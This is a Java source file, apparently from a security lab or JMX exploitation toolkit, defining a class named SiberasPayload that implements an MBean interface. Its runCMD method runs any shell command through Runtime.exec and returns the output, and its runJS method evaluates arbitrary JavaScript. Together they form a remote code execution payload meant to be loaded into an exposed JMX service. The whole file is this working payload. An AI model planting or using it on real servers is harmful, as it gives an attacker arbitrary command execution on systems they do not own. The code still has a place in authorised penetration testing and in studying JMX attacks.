package de.siberas.lab;

import javax.script.ScriptEngineManager;
import java.io.InputStreamReader;
import javax.script.ScriptEngine;

public class SiberasPayload implements SiberasPayloadMBean {

	@Override
	public String runCMD(String cmd) {

		try {
			java.lang.Runtime runtime = java.lang.Runtime.getRuntime();
			java.lang.Process p = runtime.exec(cmd);

			p.waitFor();

			java.io.InputStream is = p.getInputStream();
			java.io.BufferedReader reader = new java.io.BufferedReader(new InputStreamReader(is));
        
			
			StringBuilder output = new StringBuilder();
			String tmpString;
			while ((tmpString = reader.readLine()) != null) {
				output.append(tmpString);
			}
        
			is.close();
			return output.toString();
		}
		catch(Exception ex) {
			return ex.getMessage();
		}
	}

	@Override
	public String runJS(String js) {
		try {
			ScriptEngineManager factory = new ScriptEngineManager();
			ScriptEngine engine = factory.getEngineByName("JavaScript");
			return (String) engine.eval(js);
		} catch(Exception ex) {
			return ex.getMessage();
		}
	}

}
